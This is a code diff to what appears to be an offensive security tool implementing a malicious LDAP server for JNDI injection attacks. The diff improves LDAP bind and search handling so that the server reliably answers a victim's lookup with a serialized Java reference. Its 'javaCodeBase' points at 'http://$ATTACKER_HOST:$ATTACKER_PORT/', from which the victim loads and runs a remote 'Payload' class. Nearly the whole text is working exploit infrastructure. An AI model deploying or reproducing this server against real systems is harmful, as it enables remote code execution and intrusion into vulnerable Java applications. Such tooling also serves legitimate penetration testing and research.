@@ -4,7 +4,9 @@ import importlib
 import string
 
 from bs4 import BeautifulSoup
+from pyasn1.codec.ber.decoder import decode
 from pyasn1.codec.ber.encoder import encode
+from pyasn1.error import PyAsn1Error
 
 from LDAP import LDAPMessage
 from horrors import (
@@ -61,10 +63,23 @@ class LDAP:
         logging.debug('Sending LDAP searchResDone: ' + str(response))
         return response
 
-class JNDI(services.Service):
+    @classmethod
+    def bindResponse(cls):
+        record = LDAPMessage()
+        record['messageID'] = 1
+        res = record['protocolOp']['bindResponse']
+        res['resultCode'] = 0
+        res['matchedDN'] = ''
+        res['errorMessage'] = ''
+        response = encode(record)
+        logging.debug('Sending LDAP bindResponse: ' + str(response))
+        return response
 
-    RESPONSE_SUCCESS = b'0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00'
-    RESPONSE_HELLO = b'0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00'
+    @classmethod
+    def deserialize(cls, raw):
+        return decode(raw, asn1Spec=LDAPMessage())[0]
+
+class JNDI(services.Service):
     RESPONSE_LDAP_SERIALIZED = {
         'javaClassName': 'Payload',
         'javaCodeBase': 'http://$ATTACKER_HOST:$ATTACKER_PORT/',  # NOTE: Path must end with '/'
@@ -87,7 +102,7 @@ class JNDI(services.Service):
         for ldap_type in self.RESPONSE_LDAP.values():
             for key, val in ldap_type.items():
                 try:
-                    ldap_type[key] = string.Template(val).substitute(context)                
+                    ldap_type[key] = string.Template(val).substitute(context)
                 except KeyError:
                     pass
 
@@ -102,21 +117,18 @@ class JNDI(services.Service):
     async def handler(self, reader, writer):
         socket = writer.get_extra_info('socket')
         logging.info('{}:{} requested data, responding with payload...'.format(*socket.getpeername()))
-        await reader.read(8096)
-        writer.write(self.RESPONSE_HELLO)
-        await asyncio.sleep(0.5)
-        query = await reader.read(8096)
+        await reader.read(8096)  # NOTE: BindRequest
+        writer.write(LDAP.bindResponse())
+        query = await reader.read(8096)  # Note: SearchRequest
         try:
-            query_name = query[9:9 + query[8]].decode()
-        except IndexError:
-            pass
-        else:
-            logging.debug('Responding to query: ' + query_name)
-            response = self.serialize(query_name)
-            writer.write(response)
-            await writer.drain()
-            writer.write(LDAP.searchResDone())
-            await writer.drain()
+            query_name = LDAP.deserialize(query)['protocolOp']['searchRequest']['baseObject']
+        except PyAsn1Error:
+            query_name = 'reference'
+        logging.debug('Responding to query: ' + query_name)
+        response = self.serialize(query_name)
+        await writer.drain()
+        writer.write(response)
+        writer.write(LDAP.searchResDone())
         writer.write_eof()
         writer.close()
 
